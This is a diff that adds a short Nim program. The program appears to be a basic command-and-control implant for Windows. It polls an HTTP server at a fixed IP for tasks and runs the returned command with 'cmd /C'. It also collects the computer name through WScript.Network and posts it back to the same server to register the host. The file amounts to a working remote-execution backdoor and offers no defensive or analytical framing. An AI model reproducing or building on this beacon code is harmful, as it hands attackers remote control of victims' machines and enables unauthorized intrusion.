@@ -1,0 +1,48 @@
+import json
+import std/httpclient
+import std/osproc
+import winim/com
+
+# RegisterInfo struct
+type
+  RegisterInfo = object
+    DesktopName: string
+
+# First we'll define our types
+type
+  Shell = object
+    cmd: string
+
+var client = newHttpClient()
+var content = client.getContent("http://10.110.6.88/tasks")
+echo content
+
+# Let's say this is the JSON we want to convert
+let jsonObject = parseJson(content)
+
+let shellStruct = to(jsonObject, Shell)
+
+let s = "cmd /C " & shellStruct.cmd
+# echo s, this would print the full command
+ 
+var exec = execCmd(s)
+
+#let stdout = %* {"stdout": element.cmd}
+# echo stdout
+
+
+comScript: 
+    var wshNetwork = CreateObject("WScript.Network")
+    var desktopName = wshNetwork.ComputerName
+
+var regInfo = RegisterInfo(DesktopName: desktopName) 
+echo regInfo.DesktopName
+
+
+client.headers = newHttpHeaders({ "Content-Type": "application/json" })
+let body = %*{
+    "DesktopName": regInfo.DesktopName
+}
+let response = client.request("http://10.110.6.88/reg", httpMethod = HttpPost, body = $body)
+echo response.status
+
